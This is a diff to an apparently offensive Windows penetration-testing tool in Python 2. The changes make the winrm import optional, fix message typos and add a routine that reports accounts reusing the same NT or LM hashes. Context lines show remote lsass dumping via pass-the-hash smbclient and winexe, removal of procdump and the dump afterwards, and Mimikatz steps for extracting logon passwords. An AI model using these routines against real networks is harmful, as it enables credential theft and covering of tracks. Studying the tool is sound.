@@ -7,10 +7,18 @@
 # I am no longer affiliated with the original project.
 
 import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
-import socket, fcntl, struct, time, base64, logging, urllib, winrm
+import socket, fcntl, struct, time, base64, logging, urllib
 
 import time
 import xml.etree.ElementTree as ET
+
+try:
+	import winrm
+except ImportError:
+	print("You need to install winrm")
+	print("pip install pywinrm")
+	logging.error("winrm missing")
+	exit(1)
 
 try:
 	from nmb.NetBIOS import NetBIOS
@@ -1196,12 +1204,12 @@ def datadump(user, passw, host, path, os_version):
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
 					if os.path.isfile(outputpath+host+"/lsass.dmp"):
-						print colored("[+]lsass.dmp file found",'green')
+						print colored("[+]"+outputpath+host+"/lsass.dmp file found",'green')
 
-						print colored("[+]Info",'green')
-						print colored("\n[+]To parse - run Mimikatz",'yellow')
+						print colored("\n[+]Info",'green')
+						print colored("[+]To parse - run Mimikatz",'yellow')
 						print colored("[+]Type, sekurlsa::Minidump lsass.dmp",'yellow')
-						print colored("[+]Yype, sekurlsa::logonPasswords\n",'yellow')
+						print colored("[+]Type, sekurlsa::logonPasswords\n",'yellow')
 
 					else:
 						print colored("[-]lsass.dmp file not found",'red')        
@@ -2060,6 +2068,9 @@ def hashparse(hashfolder,hashfile):
 	lst_lmhash=[]
 	lst_lmuser=[]
 
+	usedhash=[]
+	ntduplicates=[]
+
 	if file2parse!='':
 		print colored('\n[+]Parsing hashes...','yellow') 
 		if os.path.isfile(file2parse):
@@ -2137,6 +2148,85 @@ def hashparse(hashfolder,hashfile):
 			with open(hashfolder+'/lm_usernames.txt') as f:
 				print colored('[+]'+str(sum(1 for _ in f))+' LM usernames written to '+hashfolder+'/lm_usernames.txt\n','red') 
 
+		#Find Duplicate Hashes - Password Sharing Across Accounts
+
+		#Check that our NT file exists
+		if os.path.isfile(hashfolder+'/nt.txt'):
+			#Open NT file
+			with open(hashfolder+'/nt.txt','r') as inifile:
+				#Read in data
+				data=inifile.read()
+				#split lines
+				hash_list=data.splitlines()
+				#loop throught all hashes
+				for y in xrange(0,len(hash_list)):
+					#Check to see if hash already exists in dirty hash list
+					try:
+						value_index = usedhash.index(hash_list[y].split(":")[3])
+					except:
+						value_index = -1
+
+					#If it doesn't exist then proceed
+					if value_index == -1:
+
+						for z in xrange(0,len(hash_list)):
+							if hash_list[y].split(":")[3]==hash_list[z].split(":")[3]:
+								if hash_list[y].split(":")[0]!=hash_list[z].split(":")[0]:
+
+									#print hash_list[y].split(":")[0]+" hash same as " +hash_list[z].split(":")[0]
+									ntduplicates.append(hash_list[y].split(":")[0]+" hash same as " +hash_list[z].split(":")[0])
+									#Add previous found hash to dirty list
+									usedhash.append(hash_list[y].split(":")[3])
+
+						set(usedhash)
+
+			#Write duplicates to file.
+			fout=open(hashfolder+'/ntduplicates.txt','w')
+			for dup in ntduplicates:
+				fout.write(dup+'\n')
+			fout.close()
+
+			if os.path.isfile(hashfolder+'/ntduplicates.txt'):
+				print colored('[+] NT Hash Reuse usernames written to '+hashfolder+'/ntduplicates.txt\n','blue') 
+
+		#Check that our NT file exists
+		if os.path.isfile(hashfolder+'/lm.txt'):
+			#Open NT file
+			with open(hashfolder+'/lm.txt','r') as inifile:
+				#Read in data
+				data=inifile.read()
+				#split lines
+				hash_list=data.splitlines()
+				#loop throught all hashes
+				for y in xrange(0,len(hash_list)):
+					#Check to see if hash already exists in dirty hash list
+					try:
+						value_index = usedhash.index(hash_list[y].split(":")[2])
+					except:
+						value_index = -1
+
+					#If it doesn't exist then proceed
+					if value_index == -1:
+
+						for z in xrange(0,len(hash_list)):
+							if hash_list[y].split(":")[2]==hash_list[z].split(":")[2]:
+								if hash_list[y].split(":")[0]!=hash_list[z].split(":")[0]:
+
+									#print hash_list[y].split(":")[0]+" hash same as " +hash_list[z].split(":")[0]
+									ntduplicates.append(hash_list[y].split(":")[0]+" hash same as " +hash_list[z].split(":")[0])
+									#Add previous found hash to dirty list
+									usedhash.append(hash_list[y].split(":")[2])
+
+						set(usedhash)
+
+			#Write duplicates to file.
+			fout=open(hashfolder+'/lmduplicates.txt','w')
+			for dup in ntduplicates:
+				fout.write(dup+'\n')
+			fout.close()
+
+			if os.path.isfile(hashfolder+'/lmduplicates.txt'):
+				print colored('[+] LM Hash Reuse usernames written to '+hashfolder+'/lmduplicates.txt\n','blue') 
 
 #Routine gets the enabled/disabled status of a user
 def userstatus(targetpath,dcip,inputfile,dom_name):
@@ -2665,6 +2755,7 @@ hgroup.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<O
 hgroup.add_argument("-hQ", "--qldap", dest="qldap", default="", help="<Optional> In conjunction with the -i and -n option - Query LDAP for Account Status when dumping Domain Hashes")
 hgroup.add_argument("-hS", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
 hgroup.add_argument("-hP", "--pass_on_blank", dest="pass_on_blank", default="Password1", help="Password to use when only username found in Creds File")
+hgroup.add_argument("-hPH", "--parse_hashes", dest="parse_hashes", default="n", help="<Optional> Parses hash file")
 hgroup.add_argument("-hK", "--mimikittenz", dest="mimikittenz", default="n", help="<Optional> Run Mimikittenz")
 hgroup.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
 hgroup.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
@@ -2773,7 +2864,7 @@ snarf_shell=args.snarf_shell
 scf_creator=args.scf_creator
 file_transcribe=args.file_transcribe
 arp_spoof=args.arp_spoof
-
+parse_hashes=args.parse_hashes
 
 
 #Check Bash Tab Complete Status and Display to Screen
@@ -2793,6 +2884,17 @@ if args.auto_complete!='n':
 
 if args.snarf_shell!='n':
 	connect()
+	sys.exit()
+
+if args.parse_hashes!='n':
+	usr_response = raw_input("Enter the path here (e.g. /tmp/192.168.1.1/): ")
+	usr_response1 = raw_input("Enter the filename here (e.g. nt.txt): ")
+
+	if not os.path.isfile(usr_response+usr_response1):
+			print colored("[!] File not found ",'red')
+			sys.exit(1)
+
+	hashparse(usr_response,usr_response1)
 	sys.exit()
 
 #Work around for if a password has !! as the command line will bork
@@ -3441,8 +3543,8 @@ if lsass_dump == "wmi":
 		if os.path.isfile(outputpath+targets[0]+"/lsass.dmp"):
 			print colored("[+]"+outputpath+targets[0]+"/lsass.dmp file found",'green')
 			
-			print colored("[+]Info",'green')
-			print colored("\n[+]To parse - run Mimikatz",'yellow')
+			print colored("\n[+]Info",'green')
+			print colored("[+]To parse - run Mimikatz",'yellow')
 			print colored("[+]Type, sekurlsa::Minidump lsass.dmp",'yellow')
 			print colored("[+]Type, sekurlsa::logonPasswords\n",'yellow')
 
